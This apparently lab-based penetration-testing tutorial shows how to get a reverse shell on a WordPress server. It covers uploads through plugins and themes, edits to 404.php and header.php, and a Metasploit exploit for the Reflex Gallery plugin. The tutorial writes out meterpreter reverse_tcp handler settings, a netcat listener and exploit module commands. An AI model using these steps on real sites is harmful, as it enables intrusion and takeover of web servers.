
#### **PHP Reverse Shell**

After exploit a remote command execution vulnerability then we can use a reverse shell to obtain an interactive shell session on the target machine. Throughout our article we are going to use this web shell to achieve the reverse shell of the target machine. Ready  **![😛]We execute the given command to edit the localhost address from the malicious shell.

nano /usr/share/webshells/php/php-reverse-shell.php

![](https://secnhack.in/wp-content/uploads/2021/01/1-5.png)

We are doing this demonstration in a lab environment so we already have access to the admin panel of the target WordPress CMS that you should also have.

![](https://secnhack.in/wp-content/uploads/2021/01/2-6.png)

#### **Shell Uploading through Plugin**

In our first attempt, we will upload our shell through wordpress “**Add Plugin**” feature. Go to the Plugins section, select Add New, go to the location and select php reverse shell and upload it by clicking on “**Install Now**” button.

![](https://secnhack.in/wp-content/uploads/2021/01/3-6.png)

Basically the plugin should be in the .zip file format and we uploaded a file with the **.php** extension which caused the error. Just ignore this error and proceed to the next step.

![](https://secnhack.in/wp-content/uploads/2021/01/4-6.png)

Basically the WordPress CMS has an “**uploads**” directory, where the uploaded file is saved. After accessing the correct directory browse the location on the browser with php reverse shell.

192.168.1.13:8000/wp-content/uploads/2021/01/php-reverse-shell.php

![](https://secnhack.in/wp-content/uploads/2021/01/5-6.png)

**Amazing ![😛]() !!** We go back to the system and setup the multi-handler to capture the target meterpreter session. After refreshing the location again we get the meterpreter session of the target web server.

use exploit/multi/handler

set payload php/meterpreter/reverse_tcp

set lhost 192.168.1.13

set lport 1234

run

![](https://secnhack.in/wp-content/uploads/2021/01/6-7.png)

As well as we also can use netcat listener to get reverse shell of the target web server.

nc -lvp 1234

![](https://secnhack.in/wp-content/uploads/2021/01/7-8.png)

#### **Shell Uploading through Theme**

In this effort we will transfer our malicious shell through the templates. Choose any new WordPress theme according to you or you can download our theme from here. Once downloaded then extract the zip file and go inside the theme’s folder, where you will find the “**index.html**” file.


https://wordpress.org/themes/twentytwenty/

![](https://secnhack.in/wp-content/uploads/2021/01/8-7.png)

Just open it and replace the entire content with malicious php reverse shell.

![](https://secnhack.in/wp-content/uploads/2021/01/9-6.png)

Compress that folder again into zip file format.

![](https://secnhack.in/wp-content/uploads/2021/01/10-5.png)

Go the theme section, click on add new and select the modified zip file and upload it.

![](https://secnhack.in/wp-content/uploads/2021/01/11-5.png)

Another step left is to activate the uploaded template.

![](https://secnhack.in/wp-content/uploads/2021/01/12-4.png)

access the main web page after activating the template, we have the reverse shell of the target web server.

![](https://secnhack.in/wp-content/uploads/2021/01/13-4.png)

#### **Shell Uploading into 404.php File**

As we know that the 404. php file is used on a page not found error, so we can use this file get reverse shell of target machine. Simply remove the entire code inside the 404.php file.

![](https://secnhack.in/wp-content/uploads/2021/01/14-2.png)

Copy and paste the code of the malicious PHP file here and save. The localhost address has to be changed there.

![](https://secnhack.in/wp-content/uploads/2021/01/15-2.png)

We go to the browser, click on any post and add our arbitrary text between the URLs to get a 404 error.

![](https://secnhack.in/wp-content/uploads/2021/01/16-2.png)

But actually we get the reverse shell of the target web server without any doubt.

![](https://secnhack.in/wp-content/uploads/2021/01/17-2.png)

#### **Shell Uploading into header.php file**

As we know the header is all the content that is displayed on all the pages of your site, so we upload our malicious shell here.

![](https://secnhack.in/wp-content/uploads/2021/01/18-2.png)

As soon as we save the header file with malicious shell, then we get the reverse shell of the target web application.

![](https://secnhack.in/wp-content/uploads/2021/01/19-2.png)

#### **Shell Uploading through Vulnerable Plugin**

Sometimes plugins installed in WordPress CMS are vulnerable, by taking advantage of which we can upload our malicious PHP shells to the target server and get reverse shells. In our case, as you can see a vulnerable plugin called [**Reflex**](https://www.exploit-db.com/exploits/36374) is located on the WordPress CMS, so now we will try to exploit target mahcine by uploading shell through this plugin.

![](https://secnhack.in/wp-content/uploads/2021/01/20-2.png)

We usually discover exploits by putting the name of that plugin on the metasploit Framework. Really we get the exploit


search reflex

![](https://secnhack.in/wp-content/uploads/2021/01/21-1.png)

As soon as we fill the target details and run the exploit then it automatically uploads the malicious shell to the target web server as you can see in the image below.


use exploit/unix/webapp/wp_reflexgallery_file_upload

set rhosts 192.168.1.13

set rport 8000

run

![](https://secnhack.in/wp-content/uploads/2021/01/22-1.png)

**Finally**, we get the meterpreter session, from where we can remotely manage, add, delete, and perform many activities on the target web server.